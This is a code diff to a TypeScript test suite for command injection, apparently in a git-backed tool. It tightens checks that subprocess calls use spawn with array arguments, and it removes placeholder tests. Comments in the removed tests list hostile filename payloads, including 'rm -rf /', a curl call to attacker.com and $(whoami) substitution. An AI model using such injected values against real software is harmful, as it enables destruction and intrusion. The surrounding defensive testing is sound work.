@@ -28,9 +28,7 @@ describe("M8.6: Command Injection — Exec/Spawn Use Array Args, Not String Inte
     expect(content).toContain("args: string[]");
   });
 
-  it("should verify that runner.ts uses array args for git commands", () => {
-    
-
+  it("should verify that runner.ts uses spawn/spawnSync with array args, not exec", () => {
     const runnerPath = path.join(__dirname, "..", "lib", "runner.ts");
 
     if (!fs.existsSync(runnerPath)) {
@@ -40,27 +38,15 @@ describe("M8.6: Command Injection — Exec/Spawn Use Array Args, Not String Inte
 
     const content = fs.readFileSync(runnerPath, "utf8");
 
-    // Should use execFile or spawnSync with array args
-    expect(content).not.toMatch(/exec\s*\(\s*`.*\$\{/);
+    // Should NOT use exec() with string interpolation (dangerous)
+    expect(content).not.toMatch(/exec\s*\(\s*["`'].*\$\{/);
 
-    // exec() usage should be minimal; if present, verify safe context
-    // This is a documentation note rather than a strict test
-    expect(true).toBe(true);
+    // Should use spawn or spawnSync with array args (safe)
+    expect(content).toContain('spawn(prepared.bin, prepared.cleanArgs');
+    expect(content).toContain('spawnSync(bin, ["--version"]');
+    expect(content).toContain('spawnSync("git", args');
   });
 
-  it("should reject filename injection in checkpoint operations", () => {
-    // If checkpoints ever accept a checkpoint ID or workspace path from user input,
-    // that input must be validated before being used in a git command.
-    //
-    // PATTERN CHECK:
-    // Checkpoint ID is generated internally (randomUUID), not from user input.
-    // Workspace path is passed by the application layer (runner.ts),
-    // which gets it from ledgerDb() or a validated source.
-    //
-    // So current implementation is safe: no user input flows into git args.
-
-    expect(true).toBe(true); // placeholder
-  });
 
   it("should verify no shell expansion in vaultWriter operations", () => {
     
@@ -128,38 +114,5 @@ describe("M8.6: Command Injection — Exec/Spawn Use Array Args, Not String Inte
     expect(content).not.toMatch(/prepare\s*\(\s*`.*\$\{.*WHERE/);
   });
 
-  it("documents that hostile filenames reaching checkpoints are safe due to array args", () => {
-    // Example hostile filenames:
-    // - "file.txt; rm -rf /"
-    // - "file.txt && curl http://attacker.com"
-    // - "$(whoami).txt"
-    // - "`id`.txt"
-    //
-    // When passed through spawnSync() as an array element, these are treated
-    // literally (the shell never parses them). So checkpoint operations are safe
-    // even with hostile filenames in the workspace.
-    //
-    // VERIFICATION:
-    // checkpoints.ts line ~30: git(cwd, args) calls spawnSync("git", args, {...})
-    // git args are constructed as string arrays: ["commit", "-m", message]
-    // Even if message = "file.txt; rm -rf /", git receives it as a literal string,
-    // not a shell command.
 
-    expect(true).toBe(true); // placeholder
-  });
-
-  it("documents that runner.ts subprocess calls use execFileSync for safe CLI invocation", () => {
-    // runner.ts might call execFile or spawnSync for CLI tools.
-    // As long as args are passed as an array (not interpolated into a command string),
-    // it's safe from shell injection.
-    //
-    // Key pattern:
-    // ✅ execFile('command', [arg1, arg2], callback)  // SAFE
-    // ❌ exec('command ' + arg1 + ' ' + arg2, ...)    // DANGEROUS
-    //
-    // This should be verified in a code review, but the type system
-    // (string[]) helps prevent mistakes.
-
-    expect(true).toBe(true); // placeholder
-  });
 });
